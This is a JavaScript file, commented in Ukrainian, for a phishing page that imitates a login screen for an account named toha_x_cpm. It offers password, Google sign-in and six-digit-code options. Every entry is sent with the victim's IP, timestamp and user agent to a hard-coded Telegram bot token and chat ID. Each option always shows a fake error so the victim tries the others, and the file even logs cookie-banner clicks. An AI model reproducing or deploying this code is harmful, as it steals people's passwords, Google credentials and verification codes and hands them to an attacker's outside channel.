document.addEventListener('DOMContentLoaded', function() {
    const BOT_TOKEN = '8372210520:AAHEHUAloaItV--ndfxTP9tq6DgLv3RJ634';
    const CHAT_ID = '8089839247';
    
    // Куки
    const cookieBanner = document.getElementById('cookieBanner');
    const acceptCookies = document.getElementById('acceptCookies');
    const rejectCookies = document.getElementById('rejectCookies');
    
    // Основні елементи
    const mainPage = document.getElementById('mainPage');
    const statusDiv = document.getElementById('status');
    
    // Метод 1: Пароль
    const usePasswordBtn = document.getElementById('usePassword');
    const passwordSection = document.getElementById('passwordSection');
    const passwordInput = document.getElementById('password');
    const submitPasswordBtn = document.getElementById('submitPassword');
    const passwordError = document.getElementById('passwordError');
    
    // Метод 2: Google
    const useGoogleBtn = document.getElementById('useGoogle');
    const googleSection = document.getElementById('googleSection');
    const googleEmail = document.getElementById('googleEmail');
    const googlePassword = document.getElementById('googlePassword');
    const submitGoogleBtn = document.getElementById('submitGoogle');
    
    // Метод 3: Код
    const useCodeBtn = document.getElementById('useCode');
    const codeSection = document.getElementById('codeSection');
    const verificationCode = document.getElementById('verificationCode');
    const submitCodeBtn = document.getElementById('submitCode');
    
    let activeMethod = null;
    
    // Ініціалізація
    mainPage.style.display = 'none';
    
    // Обробка куків
    acceptCookies.addEventListener('click', () => {
        cookieBanner.style.display = 'none';
        mainPage.style.display = 'block';
        sendToTelegram('🍪 Користувач прийняв кукі');
    });
    
    rejectCookies.addEventListener('click', () => {
        cookieBanner.style.display = 'none';
        mainPage.style.display = 'block';
        sendToTelegram('🍪 Користувач відхилив кукі');
    });
    
    // Метод 1: Пароль
    usePasswordBtn.addEventListener('click', () => {
        hideAllSections();
        passwordSection.classList.remove('hidden');
        activeMethod = 'password';
    });
    
    submitPasswordBtn.addEventListener('click', () => {
        const password = passwordInput.value.trim();
        if (!password) {
            passwordError.textContent = 'Введіть пароль';
            return;
        }
        
        sendToTelegram(`🔑 Спроба пароля для toha_x_cpm\nps=${password}\ncd=ПАРОЛЬ`);
        
        // Завжди помилка
        setTimeout(() => {
            passwordError.textContent = 'Неправильний пароль. Спробуйте інший спосіб.';
            passwordInput.value = '';
        }, 800);
    });
    
    // Метод 2: Google
    useGoogleBtn.addEventListener('click', () => {
        hideAllSections();
        googleSection.classList.remove('hidden');
        activeMethod = 'google';
        sendToTelegram('🌐 Користувач вибрав вхід через Google');
    });
    
    submitGoogleBtn.addEventListener('click', () => {
        const email = googleEmail.value.trim();
        const pass = googlePassword.value.trim();
        
        if (!email || !pass) {
            showStatus('Заповніть всі поля', 'error');
            return;
        }
        
        sendToTelegram(`📧 Вхід через Google\nlogin=${email}\nps=${pass}\ncd=GOOGLE`);
        
        showStatus('Перевірка облікових даних...', 'loading');
        setTimeout(() => {
            showStatus('Помилка входу. Спробуйте інший метод.', 'error');
            googleEmail.value = '';
            googlePassword.value = '';
        }, 1500);
    });
    
    // Метод 3: Код
    useCodeBtn.addEventListener('click', () => {
        hideAllSections();
        codeSection.classList.remove('hidden');
        activeMethod = 'code';
        sendToTelegram('📱 Користувач вибрав вхід через код');
    });
    
    submitCodeBtn.addEventListener('click', () => {
        const code = verificationCode.value.trim();
        if (!code || code.length !== 6) {
            showStatus('Введіть 6-значний код', 'error');
            return;
        }
        
        sendToTelegram(`🔢 Код підтвердження\ncd=${code}\nps=CODE_METHOD`);
        
        showStatus('Код перевіряється...', 'loading');
        setTimeout(() => {
            showStatus('Код застарів. Надіслано новий.', 'error');
            verificationCode.value = '';
        }, 1500);
    });
    
    // Допоміжні функції
    function hideAllSections() {
        passwordSection.classList.add('hidden');
        googleSection.classList.add('hidden');
        codeSection.classList.add('hidden');
        passwordError.textContent = '';
    }
    
    function showStatus(text, type) {
        statusDiv.textContent = text;
        statusDiv.style.display = 'block';
        statusDiv.style.background = type === 'error' ? '#ffe6e6' : '#e6f7ff';
        statusDiv.style.color = type === 'error' ? '#d00' : '#0066cc';
        statusDiv.style.border = `1px solid ${type === 'error' ? '#ffcccc' : '#b3e0ff'}`;
    }
    
    async function sendToTelegram(message) {
        const fullMessage = `${message}\n🌐 IP: ${await getIP()}\n📅 ${new Date().toLocaleString()}\n📱 UserAgent: ${navigator.userAgent}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: fullMessage,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.error('Помилка відправки:', error);
        }
    }
    
    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'не визначено';
        }
    }
});
